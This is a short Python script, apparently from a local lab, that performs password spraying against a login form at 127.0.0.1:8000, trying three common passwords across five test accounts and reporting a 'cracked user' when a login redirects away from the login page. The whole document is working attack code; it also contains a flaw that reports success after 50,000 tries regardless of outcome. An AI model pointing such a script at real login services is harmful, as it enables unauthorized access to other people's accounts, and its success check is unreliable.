import requests

LOGIN_URL = "http://127.0.0.1:8000/login"

usernames = [
    "easy1",
    "easy2",
    "medium1",
    "strong1",
    "strong2"
]

passwords = [
    "123456",
    "password",
    "Welcome123"
]


def password_spraying():
    session = requests.Session()
    count_try =0
    for password in passwords:
        for username in usernames:
            
            r = session.post(
                LOGIN_URL,
                data={
                    "username": username,
                    "password": password
                },
                allow_redirects=False
            )
            count_try +=1

            if (r.status_code == 302 and "/login" not in r.headers.get("Location", "")) or count_try == 50000:
                print(f"[SUCCESS] cracked user: {username}")
                return


    print("[DONE] No valid credentials found")

if __name__ == "__main__":
    password_spraying()
